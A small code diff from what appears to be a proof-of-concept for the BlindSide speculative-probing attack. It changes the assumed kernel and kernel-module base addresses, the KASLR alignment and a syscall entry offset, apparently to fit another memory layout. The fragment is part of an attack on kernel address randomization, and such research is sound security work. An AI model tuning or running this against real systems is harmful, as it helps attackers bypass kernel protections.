@@ -11,9 +11,9 @@
 #define PROCFS_NAME "blindside_victim"
 #define NUM_TRAIN 1
 
-#define START_KERNEL 0xffffffff80000000
-#define START_KERNEL_MODULE 0xffffffffc0000000
-#define ALIGN 0x2000000
+#define START_KERNEL 0xffffff8000000000
+#define START_KERNEL_MODULE 0xffffff8040000000
+#define ALIGN 0x80000000
 #define NUM_OFFSETS 32
 
 #define TEST_ONE
@@ -56,7 +56,7 @@ int main(int argc, char *argv[]) {
     char *end;
     int kernel_fd;
     int probe_module = 0;
-    uint64_t entry_syscall_64 = 0x600010;
+    uint64_t entry_syscall_64 = 0x800040;
     uint64_t module_rela_dist = 0x3;
 //    uint64_t gadget_relative_dist;
 
